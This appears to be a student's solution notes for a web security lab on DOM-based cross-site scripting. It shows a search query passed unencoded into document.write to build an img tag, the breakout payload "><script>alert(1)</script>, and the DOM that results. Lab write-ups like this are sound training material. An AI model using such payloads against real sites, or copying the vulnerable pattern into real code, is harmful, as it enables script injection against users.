# Lab Solution Notes

## Lab Description

- There was a search **input field**.
    
- I searched for the word `z3rob` as a test.

## Source Code Review
![Pasted image](../images/Pasted%20image%2020250426182603.png)
- I found the following code:
    
    ```javascript
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    ```
    
![Pasted image](../images/Pasted%20image%2020250426184257.png)
- Note:
    
    - The user's value (`query`) is injected into the `src` attribute of the `<img>` element without any filtering or encoding.
        
    - This is done using `document.write`, which allows writing additional HTML code to the page.
        

## Attack Idea (Exploit Idea)

- Goal: **Break out of the `<img>` tags** and inject JavaScript code.
    
- Method:
    
    - Close the open `<img>` tag.
        
    - Inject a new script.
        

## Testing

- I entered the following value in the search:
    
    ```html
    "><script>alert(1)</script>z3rob
    ```
    
- Result:
    
    - The resulting code in the DOM became:
        
        ```html
        <img src="/resources/images/tracker.gif?searchTerms="><script>alert(1)</script>z3rob">
        ```
        
    - The script was successfully executed and an alert appeared.

## Summary

- Main cause of the vulnerability: Using **`document.write`** with **user input** without protection or filtering
